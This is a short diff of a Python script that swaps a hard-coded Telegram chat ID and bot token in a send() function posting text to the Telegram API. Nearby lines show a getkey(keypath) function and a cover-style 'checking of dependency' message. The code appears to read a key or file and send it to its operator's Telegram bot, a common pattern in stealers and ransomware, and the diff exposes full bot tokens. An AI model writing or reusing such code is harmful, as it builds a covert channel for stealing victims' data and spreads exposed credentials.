@@ -9,7 +9,7 @@ import os
 import sys
 
 
-ID = 1410223644
+ID = 1316986613
 
 print("checking of dependency.....")
 try:
@@ -45,7 +45,7 @@ def getkey(keypath):
 
 
 def send(text):
-    url = f"https://api.telegram.org/bot5633216566:AAFELdeoAsacGFeK6xWhA3DCDSYEQBgQVzA/sendMessage"
+    url = f"https://api.telegram.org/bot6716575208:AAEL-MlxGPB_EdTpr1C4kNhzfGGiWo_oA4k/sendMessage"
     payload = {"chat_id": ID, "text": text}
 
     r = requests.post(url, json=payload)
